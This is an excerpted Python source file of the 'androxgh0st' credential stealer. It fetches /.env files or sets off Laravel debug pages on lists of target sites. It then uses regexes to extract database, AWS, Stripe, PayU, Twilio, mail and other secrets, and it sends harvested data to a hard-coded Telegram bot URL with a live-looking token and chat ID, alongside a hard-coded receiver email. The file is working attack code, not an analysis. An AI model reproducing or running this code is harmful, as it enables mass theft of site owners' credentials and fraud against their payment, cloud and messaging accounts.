...
class androxgh0st:
    ...
    def databse(self, text, url):
        if "DB_" in text:
            if "DB_CONNECTION=" in text:
                ...
                try:
                    db_connection = reg(
                        '<td>DB_CONNECTION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    db_connection = ''
                try:
                    db_host = reg(
                        '<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    db_host = ''
                try:
                    db_port = reg(
                        '<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    db_port = ''
                try:
                    db_database = reg(
                        '<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    db_database = ''
                try:
                    db_username = reg(
                        '<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    db_username = ''
                try:
                    db_password = reg(
    ...
    def payu(self, text, url):
        if "PAYU_" in text:
            ...
            elif '<td>PAYU_SHOP_ID</td>' in text:
                method = 'debug'
                try:
                    payu_shop_id = reg(
                        '<td>PAYU_SHOP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    payu_shop_id = ''
                try:
                    payu_merchant_pos_id = reg(
                        '<td>PAYU_MERCHANT_POS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    payu_merchant_pos_id = ''
                try:
                    payu_md5_sec_key = reg(
                        '<td>PAYU_MD5_SEC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    payu_md5_sec_key = ''
                try:
                    payu_oauth_client_id = reg(
                        '<td>PAYU_OAUTH_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    payu_oauth_client_id = ''
                try:
                    payu_oauth_client_secret = reg(
                        '<td>PAYU_OAUTH_CLIENT_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    payu_oauth_client_secret = ''         

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPAYU_SHOP_ID: ' + \
                str(payu_shop_id)+'\nPAYU_MERCHANT_POS_ID: '+str(payu_merchant_pos_id)+'\nPAYU_MD5_SEC_KEY: '+str(payu_md5_sec_key)+'\nPAYU_OAUTH_CLIENT_ID: '+str(payu_oauth_client_id)+'\nPAYU_OAUTH_CLIENT_SECRET: '+str(payu_oauth_client_secret)
            remover = str(build).replace('\r', '')
    ...
    def stripe(self, text, url):
        if "STRIPE_" in text:
            if "STRIPE_KEY=" in text:
                ...
                try:
                    stripe_key = reg(
                        '<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                except:
                    stripe_key = ''
                try:
                    stripe_secret = reg(
            ...
            remover = str(build).replace('\r', '')
            apiToken = "5909556741:AAELAUmJ0RzrLWJbF8dQCGYM7GCk3OJbZFY"
            chatID = "5848565704"
            apiURL = "https://api.telegram.org/bot" + apiToken +"/sendMessage" + "?chat_id=" + chatID + "&text=" + build
        ...
        try:
            if "AWS_ACCESS_KEY_ID" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    ...
                    try:
                        aws_key = reg(
                            "<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg(
                            "<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                ...
                if "AWS_KEY=" in text:
                    ...
                    try:
                        aws_key = reg(
                            "<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg(
                            "<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                    ...
                    try:
                        aws_buc = reg(
                            "<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_buc = ''
                if aws_reg == "":
                    aws_reg = "aws_unknown_region--"
                ...
                if "AWS_SNS_KEY=" in text:
                    ...
                    try:
                        aws_key = reg(
                            "<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg(
                            "<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        sms_from = reg(
                            "<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        sms_from = ''
                    try:
                        sms_driver = reg(
                            "<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        sms_driver = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                ...
                if "AWS_S3_KEY=" in text:
                    ...
                    try:
                        aws_key = reg(
                            "<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg(
                            "<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                ...
                if "AWS_SES_KEY=" in text:
                    ...
                    try:
                        aws_key = reg(
                            "<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg(
                            "<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
                ...
                if "SES_KEY=" in text:
                    ...
                    try:
                        aws_key = reg(
                            "<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_key = ''
                    try:
                        aws_sec = reg(
                            "<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        aws_sec = ''
                    try:
                        asu = androxgh0st().get_aws_region(text)
        ...
        try:
            if "DB" in text:
                if "DB_CONNECTION=" in text:
                    ...
                    try:
                        db_p = reg(
                            '<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        db_p = ''
        ...
        try:
            if "TWILIO" in text:
                if "TWILIO_ACCOUNT_SID=" in text:
                    ...
                    try:
                        acc_sid = reg(
                            '<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        acc_sid = ''
                    try:
                        acc_key = reg(
                    ...
                    try:
                        sec = reg(
                            '<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        sec = ''
                    try:
                        chatid = reg(
                            '<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        chatid = ''
                    try:
                        phone = reg(
                            '<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                    try:
                        auhtoken = reg(
                            '<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        auhtoken = ''
        ...
        try:
            if "NEXMO" in text:
                if "NEXMO_KEY=" in text:
                    ...
                    try:
                        nexmo_secret = reg(
                            '<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        nexmo_secret = ''
                    try:
                        phone = reg(
                            '<td>EXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nNEXMO_KEY: '+str(
                ...
                if "EXOTEL_API_KEY=" in text:
                    ...
                    try:
                        exotel_api = reg(
                            '<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_api = ''
                    try:
                        exotel_token = reg(
                            '<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_token = ''
                    try:
                        exotel_sid = reg(
                            '<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        exotel_sid = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nEXOTEL_API_KEY: '+str(
                ...
                if "ONESIGNAL_APP_ID=" in text:
                    ...
                    try:
                        onesignal_id = reg(
                            '<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_id = ''
                    try:
                        onesignal_token = reg(
                            '<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_token = ''
                    try:
                        onesignal_auth = reg(
                            '<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        onesignal_auth = ''
                ...
                if "TOKBOX_KEY_DEV=" in text:
                    ...
                    try:
                        tokbox_key = reg(
                            '<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg(
                            '<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(
                ...
                if "TOKBOX_KEY=" in text:
                    ...
                    try:
                        tokbox_secret = reg(
                            '<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(
                    tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                ...
                if "TOKBOX_KEY_OLD=" in text:
                    ...
                    try:
                        tokbox_key = reg(
                            '<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg(
                            '<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(
                    tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                ...
                if "PLIVO_AUTH_ID=" in text:
                    ...
                    try:
                        plivo_auth = reg(
                            '<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        plivo_auth = ''
                    try:
                        plivo_secret = reg(
                            '<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        plivo_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPLIVO_AUTH_ID: '+str(
        ...
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    ...
                    mailuser = reg(
                        '<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg(
                        '<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg(
                            "<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg(
                            "<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                    ...
                    if '.amazonaws.com' in mailhost:
                        ...
                        sendtestoff(url, mailhost, mailport,
                                    mailuser, mailpass, mailfrom)
                        remover = str(build).replace('\r', '')
...
def main(url):
    ...
    try:
        ...
        get_source = requests.get(
            url+"/.env", headers=headers, timeout=1, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={
                                       "0x[]": "androxgh0st"}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
        ...
        if resp:
            ...
            getpayu = androxgh0st().payu(resp, url)
            getdatabse = androxgh0st().databse(resp, url)
...
###    ### ###     ###  ########  ###    ### ########## ###    ###  ########  ####### ##########  ########      ###     
    ...
    try:
        ...
        try:
            ...
            try:
               receiver_email = "akashbdbot@gmail.com"
            except:
               receiver_email = "akashbdbot@gmail.com"
            try:
                lists = input("List :   ")
